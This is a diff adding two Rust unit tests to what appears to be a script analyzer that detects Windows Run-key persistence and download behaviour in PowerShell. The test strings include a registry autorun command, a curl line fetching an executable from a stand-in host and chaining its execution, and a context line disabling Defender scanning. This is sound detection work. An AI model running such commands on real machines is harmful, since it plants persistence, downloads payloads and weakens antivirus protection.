@@ -30423,6 +30423,62 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn powershell_run_key_itemproperty_emits_persistence_trait() {
+        let script = br#"powershell -Command "New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value 'cmd.exe /c calc.exe' -PropertyType String -Force"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "cmd.exe /c calc.exe"
+            )),
+            "PowerShell Run-key persistence missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_run_key_itemproperty_preserves_quoted_ampersand_command_value() {
+        let command = "cmd.exe /c curl -o out.exe https://ps-run-chain.example/p.exe&&calc.exe";
+        let script = format!(
+            r#"powershell -Command "New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value '{command}'""#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command: existing_command }
+                    if hive == "HKCU"
+                        && key.ends_with(r"Software\Microsoft\Windows\CurrentVersion\Run")
+                        && value_name == "Updater"
+                        && existing_command == command
+            )),
+            "PowerShell Run-key persistence command value was not preserved: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://ps-run-chain.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "PowerShell Run-key child download was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_powershell_run_key_text_does_not_emit_persistence() {
         let script = br#"echo keep ^& powershell Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Updater C:\Users\Public\updater.exe"#;
         let report = analyze(script, &Config::default());
